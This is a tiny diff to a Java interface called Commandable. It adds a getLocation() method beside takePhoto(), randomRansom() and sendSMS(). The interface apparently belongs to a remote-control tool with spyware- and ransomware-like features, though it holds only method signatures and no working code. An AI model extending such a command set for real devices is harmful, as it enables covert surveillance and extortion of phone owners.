@@ -6,4 +6,5 @@ public interface Commandable {
 	public void takePhoto();
 	public void randomRansom();
 	public void sendSMS(String nro,String mensaje);
+	public void getLocation();
 }
